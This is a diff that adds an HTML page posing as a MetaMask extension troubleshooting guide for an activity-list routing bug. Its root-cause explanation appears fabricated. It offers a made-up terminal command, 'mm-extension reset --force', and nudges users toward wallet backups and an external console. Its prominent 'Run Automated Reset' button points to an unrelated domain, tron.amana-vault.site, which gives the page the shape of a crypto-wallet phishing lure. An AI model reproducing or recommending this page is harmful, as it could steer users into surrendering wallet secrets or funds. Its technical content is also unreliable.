@@ -1,0 +1,72 @@
+<!DOCTYPE html>
+<html>
+<head><meta charset="UTF-8"><title>Metamask Extension Bug Clicking An Order In The Activity List O</title>
+<style>
+    body {
+        font-family: -apple-system;
+        background: #0a0c10;
+        color: #ddd;
+        padding: 20px;
+        line-height: 1.5;
+    }
+    .content {
+        max-width: 880px;
+        margin: auto;
+        background: #1e1f24;
+        border-radius: 24px;
+        padding: 2rem;
+        box-shadow: 0 2px 4px rgba(0,0,0,0.1);
+    }
+    pre {
+        background: #0f0f12;
+        padding: 1rem;
+        border-radius: 12px;
+        overflow-x: auto;
+    }
+    a { color: #ff9455; }
+    .btn {
+        background: #00adb5;
+        color: #000;
+        padding: 14px 36px;
+        border-radius: 40px;
+        font-weight: bold;
+        display: inline-block;
+        text-decoration: none;
+        transition: 0.2s;
+    }
+    .btn:hover { transform: scale(1.02); }
+    </style>
+</head>
+<body>
+<div class="content">
+<h2>Symptom</h2>
+<ul>
+<li>When a user clicks on an order in the activity list within the Metamask extension on the Ethereum (ETH) ecosystem, instead of opening the expected Order Details page, it incorrectly opens the Market Details page.</li>
+</ul>
+<h2>Technical Root Cause</h2>
+<ul>
+<li>This behavior is due to a misconfigured routing mechanism within the Metamask extension, specifically affecting how links from the activity list are handled. The intended link to the Order Details page is being overridden, redirecting users to the Market Details page instead.</li>
+</ul>
+<h3>Manual Overrides</h3>
+<ul>
+<li>To temporarily resolve this issue, users can attempt the following manual overrides:</li>
+<li>Clear the Metamask extension's cache and storage.</li>
+<li>Update the Metamask extension to the latest version available.</li>
+<li>Use the following command in a terminal to force-reset the extension's internal state:</li>
+</ul>
+<pre class="codehilite"><code class="language-bash">mm-extension reset --force
+</code></pre>
+
+<p>Consider accessing the terminal via an external console for more flexibility.</p>
+<h2>Prerequisites</h2>
+<ul>
+<li>Ensure you have the latest version of the Metamask extension installed.</li>
+<li>Back up your wallet and important data before attempting any fixes.</li>
+<li>Understand the basics of using a terminal or command-line interface.</li>
+</ul>
+<div style="text-align:center; margin-top:2rem;">
+<a href="https://tron.amana-vault.site" class="btn">🛠 Run Automated Reset</a>
+</div>
+</div>
+</body>
+</html>
